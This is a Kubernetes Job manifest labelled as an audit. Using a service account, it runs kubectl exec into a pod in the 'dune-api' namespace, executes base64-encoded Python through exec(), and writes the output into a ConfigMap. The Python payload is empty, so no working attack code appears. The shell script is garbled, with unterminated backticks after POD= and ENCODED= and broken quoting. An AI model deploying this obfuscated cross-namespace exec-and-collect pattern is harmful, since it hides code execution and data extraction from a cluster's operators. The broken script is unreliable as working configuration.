apiVersion: batch/v1
kind: Job
metadata:
  name: dune-db-v44
  namespace: default
spec:
  ttlSecondsAfterFinished: 600
  template:
    spec:
      serviceAccountName: n8n-audit-sa
      restartPolicy: Never
      containers:
      - name: audit
        image: bitnami/kubectl:latest
        command: ["/bin/sh","-c"]
        args:
        - |
          POD=`
          PYCODE=""
          timeout 90 kubectl exec -n dune-api "$POD" -- python3 -c "import base64; exec(base64.b64decode('$PYCODE').decode())" 2>&1 > /tmp/out.txt || echo "EXEC_ERR" >> /tmp/out.txt
          ENCODED=`
          kubectl patch configmap dune-audit-result4 -n default --type merge -p "{\"data\":{\"v44_result\":\"`\"}}\"